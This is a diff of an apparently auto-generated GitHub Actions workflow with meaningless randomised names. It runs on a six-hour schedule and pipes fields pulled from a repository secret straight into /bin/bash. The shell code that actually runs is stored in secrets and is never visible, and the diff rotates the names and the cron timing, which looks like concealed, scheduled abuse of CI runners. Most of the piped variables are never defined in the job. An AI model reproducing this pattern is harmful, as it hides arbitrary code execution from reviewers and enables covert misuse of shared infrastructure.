@@ -2,9 +2,9 @@ name: wenfuhuo9185
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 0/6 * * *'
+    - cron: '57 5/6 * * *'
 
-jobs:  # 15317
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,12 @@ jobs:  # 15317
       - uses: actions/checkout@v4
       - name: wenfuhuo9185
         env:
-          tqcea6278: ${{ secrets.tqcea6278 }}
+          hojn3: ${{ secrets.hojn3 }}
         run: |
-          echo $tqcea6278 | jq -r .nzjm4 | /bin/bash
-          echo $ab85348 | jq -r .undnm17 | /bin/bash
-          echo $sp7 | jq -r .o4 | /bin/bash
-          echo $c0 | jq -r .srlra070 | /bin/bash
-          echo $v59 | jq -r .bdddh5 | /bin/bash
-          echo $lcp459 | jq -r .h28 | /bin/bash
-          echo $dbns582 | jq -r .fmtl3316 | /bin/bash
-          echo $ygkts018 | jq -r .pvy6 | /bin/bash
+          echo $hojn3 | jq -r .seky34732 | /bin/bash
+          echo $uytk1 | jq -r .hdcql312 | /bin/bash
+          echo $txp3 | jq -r .x6 | /bin/bash
+          echo $w434 | jq -r .rkdmp6 | /bin/bash
+          echo $xv5821 | jq -r .b3813 | /bin/bash
+          echo $nan3 | jq -r .ruj0836 | /bin/bash
 
